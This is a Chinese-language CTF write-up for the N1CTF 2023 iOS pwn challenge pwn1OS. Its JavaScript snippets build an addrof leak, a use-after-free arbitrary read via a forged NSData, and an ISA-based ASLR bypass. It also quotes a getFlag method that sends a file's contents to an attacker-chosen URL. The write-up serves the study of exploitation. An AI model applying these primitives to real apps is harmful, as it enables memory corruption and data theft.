---
title: N1CTF 2023 pwn1OS writeup
contest: N1CTF 2023
year: 2023
difficulty: hard
vuln_type: pwn_unknown
tags: [iOS_pwn, Objective_C_msgSend, NSData伪造, addrof原语, arbitrary_read, ISA泄漏, ASLR绕过, 莫莫安全]
attack_chain:
  - Objective-C 桥接：Bob* bob = [[Bob alloc] init]; [bob doSomething];
  - 漏洞：getFlag 接受 urlString + base64 flag 上送外网
  - JS 桥 addrof：捕获对象地址 n1ctf.challenge/setChallenge_
  - 任意地址读：make_nsdata(addr, len) 伪造 NSData + addMultiPartData_
  - ctf.dealloc 释放后 addMultiPartData_ 复用
  - CoreServiceClass 地址 = coreservice_isa & 0x0000000ffffffff8
  - ASLR = CoreServiceClass - offset
  - 远程 URL 拼 flag 外发
key_payload: 'function addrof(obj) { ... /instance (0x[da-f]+)/ ... }'
one_liner: N1CTF 2023 pwn1OS：iOS addrof + arbitrary_read + ISA 泄漏 + ASLR 绕过。
lesson: iOS pwn 经典 addrof + arbitrary_read 组合；NSData 伪造是任意读核心；ISA + class mask 算 ASLR。
quality: high
---

# N1CTF 2023 pwn1OS writeup

## 来源
- 原文：ctfiot.com/140328.html
- 比赛：N1CTF 2023
- 团队：MOMO Security

## 攻击链

### 1. 漏洞点
```objc
+ (void)getFlag:(NSString *)urlString {
    NSString *path = [[NSBundle mainBundle] pathForResource:@"flag" ofType:nil];
    NSString *flag = [[NSData dataWithContentsOfFile:path] base64Encoding];
    NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"%@%@", urlString, flag]];
    [NSData dataWithContentsOfURL:url];
}
```
- 接受 urlString，flag 自动 base64 后拼接到 URL 外发
- 攻击者控制 urlString 即可让服务器发起请求带 flag

### 2. addrof 原语
```js
function addrof(obj) {
    var challenge = n1ctf.challenge();
    n1ctf.setChallenge_(obj)
    try { n1ctf.challenge() }
    catch(e) {
        const match = /instance (0x[da-f]+)$/i.exec(e)
        if (match) return match[1]
    }
    finally { n1ctf.setChallenge_(challenge) }
}
```
- 抛异常泄漏对象地址

### 3. 任意读
```js
function arbitrary_read(addr, len) {
    var data = make_nsdata(addr, len)
    var req = n1ctf.makeHTTRequest()
    var ctf = n1ctf.makeN1CTFIntroduction()  // malloc_size=192
    ctf.dealloc()
    req.addMultiPartData_(data)
    return ctf
}
```
- 释放后复用 NSData 内存
- 构造 fake NSData 指向目标地址

### 4. ISA 泄漏 + ASLR 绕过
```js
var coreservice = n1ctf.makeCoreService()
var coreservice_addr = addrof(coreservice)
var coreservice_memory = arbitrary_read(coreservice_addr, 0x18)
var match = /bytes = (0x[da-f]{16})/.exec(coreservice_memory)
var coreservice_isa = hexReverse(match[1])
var CoreServiceClass = BigInt("0x" + coreservice_isa) & BigInt(0x0000000ffffffff8)
var ASLR = CoreServiceClass - CoreServiceClass_offset
```

## 关键技巧
- **addrof 原语**：抛异常 + regex 提取堆地址
- **NSData 伪造**：控制 buffer 指针和 len
- **UAF 复用**：ctf.dealloc() + 立即 addMultiPartData_ 复用
- **ISA mask**：`& 0x0000000ffffffff8` 对齐 class pointer

## 适用场景
- iOS 越狱环境 pwn
- Objective-C 运行时利用
- addrof + arbitrary_read 组合
- NSData fake 任意读
